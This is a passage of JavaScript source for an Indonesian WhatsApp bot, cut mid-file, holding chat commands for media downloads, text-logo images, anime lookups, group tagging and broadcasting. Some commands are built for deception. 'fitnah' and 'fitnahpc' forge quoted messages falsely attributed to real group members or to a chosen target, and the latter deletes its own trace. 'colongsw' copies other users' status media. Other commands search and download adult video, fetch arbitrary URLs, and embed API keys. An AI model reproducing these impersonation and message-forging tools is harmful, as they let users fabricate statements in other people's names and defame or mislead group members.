📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ Durasi : ${res[0].size}`
              buttons = [{buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}buttons1 ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              imageMsg = ( await ALIYABOT.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              ALIYABOT.relayWAMessage(prep)
              fs.unlinkSync(`./ytmp.jpeg`)
              break
               case 'ytmp3':
               if (isBanned) return reply(mess.ban)
              if (args.length === 0) return reply(`Send orders *${prefix}play* _The title of the song to be search for_`)
									var srch = args.join(' ')
									aramas = await yts(srch);
									aramat = aramas.all 
									var mulaikah = aramat[0].url
									try {
										yta(mulaikah)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YOUTUBE MP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
												const captions = `🎧 *YOUTUBE MP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('There is an error')
											}
									break
						break
                                  case "ytmp4":
                                  if (isBanned) return reply(mess.ban)
                                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
        if (args.length === 0)
          return reply(
            `Send orders *${prefix}video* _The title of the song to be search for_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 999999)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YOUTUBE MP4*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the link_`
                  );
                const captions = `*YOUTUBE MP4*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
               case "pubglogo":
       
				if (args.length < 1) return reply(`Where is the text?\n*Example ${prefix}pubglogo Xhen|Bot`)
				reply(mess.wait)
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/game?text=${memek1}&text2=${memek2}&theme=pubg&apikey=beta`)
     buffer = await getBuffer(anu.result.url)
     ALIYABOT.sendMessage(from, buffer, image, {quoted: mek, caption: 'Here'})
     break
        case "foliokiri":
case 'foliokanan':
if (!c) return grupinv('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              ALIYABOT.relayWAMessage(prep)
break
case 'xs':
if (!c) return reply('Nyari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
ALIYABOT.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
if (!c) return grupinv('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
ALIYABOT.sendMessage(from, vid, video, {quoted: mek})
break
case 'listnulis':
  reply(`Example ${prefix}nulis tes
  🌹 ${prefix}nulis rival
  🌹 ${prefix}foliokanan rival
  🌹 ${prefix}foliokiri rival
  🌹 ${prefix}nuliskanan rival
  🌹 ${prefix}nuliskiri rival`)
  break
case 'foliokiri':
if (!c) return grupinv('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              ALIYABOT.relayWAMessage(prep)
break
case 'nsfw':
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return grupinv(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return grupinv('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						grupinv('Sukses mengaktifkan fitur nsfw')
						ALIYABOT.sendMessage(from, `Bebas Nyari Hentai 🗿`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati Kak')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						grupinv('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break          
                    case 'text3d2':
            if (!isRegistered) return reply (mess.banned)
                if (args.length == 0) return reply(`Example: ${prefix + command} BotIndo`)
                    txt = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://api.zeks.me/api/text3d?apikey=${zekskey}&text=${txt}`)
                    ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, caption: mess.success})
                    break
                    case 'ninjalogo':
			if (!isRegistered) return reply(mess.banned)
					var gh = body.slice(11)
					var gli = gh.split("&")[0];
					var tch = gh.split("&")[1];
					if (args.length < 1) return reply(`Example: ${prefix + command} Bot&Indo`)
					reply(mess.wait)
					buffer = await getBuffer(`https://ogata-api.herokuapp.com/api/textpro/ninjalogo?text1=${gli}&text2=${tch}&apikey=KFrfhVC4`)
					ALIYABOT.sendMessage(from, buffer, image, {quoted: mek, caption: mess.success})
					break                   		
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Thx Dah Pake`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              ALIYABOT.relayWAMessage(prep)
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ALIYABOT.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ALIYABOT.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
					break
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await ALIYABOT.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						ALIYABOT.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await ALIYABOT.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						ALIYABOT.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await ALIYABOT.downloadAndSaveMediaMessage(ger);
          ALIYABOT.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await ALIYABOT.downloadAndSaveMediaMessage(ger);
          ALIYABOT.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;

      case "caripesan":
        if (!q) return reply("pesannya apa bang?");
        let v = await ALIYABOT.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await ALIYABOT.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
         } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "lirik":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;        
case 'googlesearch':
case 'ggs':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
                case 'translate':
				case 'ts':
					return reply('Server 404 Erorr')
				  break       
      case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            ALIYABOT.sendMessage(from,ram,image,{quoted:dep,caption:rem})
            break
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara ALIYABOT`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await ALIYABOT.sendMessage(from, li, image, { quoted: mek });
        break;
      case 'pinterest':
      if (isBanned) return reply(mess.ban)
        if (!q) return reply("gambar apa?");
        if (args.length < 1) return reply(`Kirim perintah *${prefix}pinterest query`)
        reply(mess.wait)
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
buttons = [{buttonId: `pinterest ${q}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(di, "imageMessage", { thumbnail: di, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Alya✓Chan︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @callme_alya_`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: foncevid})
              ALIYABOT.relayWAMessage(prep)
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
      case "[💬status":
        grupinv(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        ALIYABOT.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
        case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				ALIYABOT.updatePresence(from, Presence.composing)
					anu = await ALIYABOT.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							ALIYABOT.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ALIYABOT.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							ALIYABOT.sendMessage(_.jid, buff, sticker, { quoted: foncevid, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ALIYABOT.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ALIYABOT.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ALIYABOT.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        ALIYABOT.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        grupinv(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await ALIYABOT.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await ALIYABOT.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;      
      case "fast":
        if (!isQuotedVideo) return reply("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            ALIYABOT.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return reply("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            ALIYABOT.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return reply("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          ALIYABOT.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case 'buttons5':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{})
              ALIYABOT.relayWAMessage(prep)
              break
          case 'buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{})
              ALIYABOT.relayWAMessage(prep)
              break
          case 'tod':
              result =`*Truth Or Dare*\nPemain diberi pilihan antara menjawab pertanyaan dengan jujur, atau melakukan tantangan yang diberikan`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:ftex})
              ALIYABOT.relayWAMessage(prep)
              break
              case "yuri":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ALIYABOT.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
	case 'halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
				case 'googletxt':
